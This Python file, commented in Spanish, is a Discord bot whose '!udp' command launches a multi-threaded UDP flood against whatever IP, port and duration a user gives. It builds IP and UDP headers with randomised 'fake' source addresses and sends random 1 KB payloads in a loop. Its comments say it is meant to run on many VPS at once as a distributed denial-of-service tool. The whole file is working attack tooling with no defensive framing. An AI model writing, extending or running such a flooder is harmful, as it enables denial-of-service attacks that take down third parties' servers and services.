import discord
from discord.ext import commands
import socket
import random
import threading
import time
import os

# Nombre del archivo para guardar el token
TOKEN_FILE = "token.txt"

# --- Funciones para el UDP Flood ---

def generar_datos(longitud=1024):
    """Genera datos aleatorios para enviar en el paquete UDP."""
    return os.urandom(longitud)

def generar_cabeceras():
    """Genera cabeceras IP y UDP aleatorias."""
    ip_header = bytearray([
        0x45,  # Version and IHL
        0x00,  # DSCP and ECN
        0x00, 0x54,  # Total Length (ajustar luego)
        0x00, 0x00,  # Identification
        0x40, 0x00,  # Flags and Fragment Offset
        0x40,  # TTL
        0x11,  # Protocol (UDP)
        0x00, 0x00,  # Header Checksum (ajustar luego)
        random.randint(1, 255), random.randint(1, 255), random.randint(1, 255), random.randint(1, 255),  # Source IP (falsa)
        random.randint(1, 255), random.randint(1, 255), random.randint(1, 255), random.randint(1, 255)   # Destination IP (se reemplaza luego)
    ])

    udp_header = bytearray([
        random.randint(1024, 65535) >> 8, random.randint(1024, 65535) & 0xFF, # Source Port (aleatorio)
        0x00, 0x00,  # Destination Port (se reemplaza luego)
        0x00, 0x36,  # Length (ajustar luego)
        0x00, 0x00   # Checksum
    ])
    return ip_header, udp_header

def udp_flood(ip, port, tiempo, num_threads):
    """Realiza el ataque UDP Flood."""
    def enviar_paquetes():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while time.time() - start_time < tiempo:
                ip_header, udp_header = generar_cabeceras()
                data = generar_datos() # Ya genera datos de 1024 bytes

                # Reemplazar IP de destino en la cabecera IP
                dest_ip_bytes = bytes(map(int, ip.split('.')))
                ip_header[16:20] = dest_ip_bytes

                # Reemplazar Puerto de destino en la cabecera UDP
                udp_header[2:4] = port.to_bytes(2, 'big')

                # Ajustar Longitud Total en cabecera IP
                longitud_total = len(ip_header) + len(udp_header) + len(data)
                ip_header[2:4] = longitud_total.to_bytes(2, 'big')

                # Ajustar Longitud en cabecera UDP
                udp_header[4:6] = (8 + len(data)).to_bytes(2, 'big') #8 bytes cabecera UDP

                # Enviar el paquete
                paquete_completo = bytes(ip_header) + bytes(udp_header) + data
                sock.sendto(paquete_completo, (ip, port))
        except Exception as e:
            print(f"Error en thread: {e}")  # Debugging
        finally:
            sock.close()

    start_time = time.time()
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=enviar_paquetes)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    print("Ataque UDP Flood completado.")

# --- Configuración del Bot de Discord ---

intents = discord.Intents.default()
intents.message_content = True  # Habilitar lectura de contenido de mensajes

bot = commands.Bot(command_prefix="!", intents=intents)

# --- Eventos del Bot ---

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user.name}")

# --- Comandos del Bot ---

@bot.command()
async def udp(ctx, ip=None, port=None, tiempo=None):
    """Realiza un ataque UDP Flood a la IP y puerto especificados."""
    if ip is None or port is None or tiempo is None:
        await ctx.send("Faltan parámetros.  Uso: `!udp <IP> <Puerto> <Tiempo>`")
        return

    try:
        ip = str(ip)
        port = int(port)
        tiempo = int(tiempo)
    except ValueError:
        await ctx.send("Puerto y Tiempo deben ser números enteros.")
        return

    if not (0 < port < 65536):
        await ctx.send("El puerto debe estar entre 1 y 65535.")
        return

    if tiempo <= 0:
        await ctx.send("El tiempo debe ser mayor que cero.")
        return

    await ctx.send(f"Iniciando ataque UDP Flood a {ip}:{port} durante {tiempo} segundos...")
    # Número de threads.  Aumentar puede saturar la API si el bot está en muchas VPS.
    num_threads = 10
    threading.Thread(target=udp_flood, args=(ip, port, tiempo, num_threads)).start()
    await ctx.send("Ataque iniciado en segundo plano.")

# --- Obtener Token ---

def obtener_token():
    """Obtiene el token de Discord del archivo o lo solicita al usuario."""
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            return token
    else:
        token = input("Ingrese el token de su bot de Discord: ")
        with open(TOKEN_FILE, "w") as f:
            f.write(token)
        return token

# --- Ejecución del Bot ---

if __name__ == "__main__":
    token = obtener_token()
    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print("Error: Token inválido.  Verifique el token en token.txt o borre el archivo para ingresarlo nuevamente.")
    except discord.errors.HTTPException as e:
        print(f"Error de conexión a Discord: {e}")
        print("Esto podría deberse a demasiadas conexiones desde múltiples VPS.")
        print("Considere usar menos VPS o un retraso mayor entre conexiones.")
